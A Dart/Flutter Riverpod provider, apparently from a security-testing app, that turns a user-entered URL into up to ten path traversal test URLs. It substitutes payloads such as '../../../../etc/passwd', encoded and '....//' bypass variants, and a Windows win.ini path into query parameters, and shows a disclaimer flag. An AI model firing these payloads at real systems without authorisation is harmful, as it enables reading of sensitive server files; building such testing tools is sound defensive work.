import 'package:riverpod_annotation/riverpod_annotation.dart';

part 'security_payloads_provider.g.dart';

class SecurityPayloadsState {
  final String targetUrl;
  final List<String> generatedPayloads;
  final bool showDisclaimer;

  const SecurityPayloadsState({
    this.targetUrl = '',
    this.generatedPayloads = const [],
    this.showDisclaimer = true,
  });

  SecurityPayloadsState copyWith({
    String? targetUrl,
    List<String>? generatedPayloads,
    bool? showDisclaimer,
  }) {
    return SecurityPayloadsState(
      targetUrl: targetUrl ?? this.targetUrl,
      generatedPayloads: generatedPayloads ?? this.generatedPayloads,
      showDisclaimer: showDisclaimer ?? this.showDisclaimer,
    );
  }
}

@Riverpod(keepAlive: true)
class SecurityPayloadsNotifier extends _$SecurityPayloadsNotifier {
  @override
  SecurityPayloadsState build() => const SecurityPayloadsState();

  static const ptStrings = [
    '../../../../etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '..\\..\\..\\..\\windows\\win.ini',
    '....//....//....//....//etc/passwd',
  ];

  void updateUrl(String url) {
    final trimmedUrl = url.trim();
    if (trimmedUrl.isEmpty) {
      state = state.copyWith(targetUrl: '', generatedPayloads: []);
      return;
    }

    try {
      final uri = Uri.parse(trimmedUrl);
      final List<String> variations = [];

      if (uri.queryParameters.isNotEmpty) {
        for (final key in uri.queryParameters.keys) {
          for (final pt in ptStrings) {
            final newQuery = Map<String, String>.from(uri.queryParameters);
            newQuery[key] = pt;
            variations.add(uri.replace(queryParameters: newQuery).toString());
          }
        }
      } else {
        for (final pt in ptStrings) {
          final separator = trimmedUrl.contains('?') ? '&' : '?';
          variations.add('$trimmedUrl${separator}file=$pt');
        }
      }

      state = state.copyWith(
        targetUrl: trimmedUrl,
        generatedPayloads: variations.take(10).toList(),
      );
    } catch (_) {
      state = state.copyWith(targetUrl: trimmedUrl, generatedPayloads: []);
    }
  }

  void dismissDisclaimer() {
    state = state.copyWith(showDisclaimer: false);
  }
}
